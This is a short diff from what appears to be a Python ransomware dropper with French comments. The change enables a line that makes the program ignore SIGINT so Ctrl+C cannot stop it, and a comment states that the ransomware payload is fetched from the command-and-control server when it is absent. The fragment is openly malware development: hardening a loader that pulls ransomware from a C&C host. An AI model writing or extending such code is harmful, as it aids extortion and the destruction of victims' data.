@@ -38,7 +38,7 @@ def decode_and_save_ransomware(encoded_ransomware: str, encoded_key: str):
 
 def main():
     # Ignorer les signaux SIGINT
-    # signal.signal(signal.SIGINT, signal.SIG_IGN)
+    signal.signal(signal.SIGINT, signal.SIG_IGN)
 
     # Récuperer le ransomware depuis le cnc si il n'est pas déjà présent
     if not os.path.exists(OUTPUT_FILE):
